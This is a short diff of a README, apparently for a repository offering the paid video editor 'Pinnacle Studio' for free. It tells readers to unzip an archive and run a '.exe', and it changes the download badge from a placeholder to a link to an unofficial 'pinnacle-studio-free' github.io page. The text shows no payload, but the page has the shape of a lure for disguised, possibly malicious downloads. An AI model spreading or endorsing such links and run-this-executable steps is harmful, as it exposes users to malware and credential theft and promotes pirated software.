@@ -13,7 +13,7 @@ Unzip the archive to a separate folder.
 
 Run the `.exe` file to start the application.  
 
-[![Download](https://img.shields.io/badge/Download-Now-2ea44f?style=for-the-badge)](#)
+[![Download](https://img.shields.io/badge/Download-Now-2ea44f?style=for-the-badge)](https://pinnacle-studio-free.github.io/.github/)
 
 ## 📸 Overview
  <img width="1885" height="1101" alt="pinnacle-studio-main-interface" src="https://github.com/user-attachments/assets/31c14b08-bc20-48be-9306-8c6b7d7b77ae" />
